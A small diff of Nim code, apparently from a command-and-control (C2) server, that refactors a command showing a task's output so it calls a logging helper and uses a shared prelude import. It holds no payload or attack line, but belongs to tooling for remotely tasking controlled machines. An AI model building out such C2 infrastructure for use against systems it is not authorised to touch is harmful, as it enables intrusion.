@@ -1,14 +1,9 @@
-import std/[
-  asyncdispatch, 
-  tables
-]
-
-import ../../types, ../../handleResponse
+import ../prelude
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   for task in server.tasks:
     if $task.id == args[0]:
-      handleResponse(task.client, true, task.output)
+      logTaskOutput(task)
 
 let cmd*: Command = Command(
   execProc: execProc,
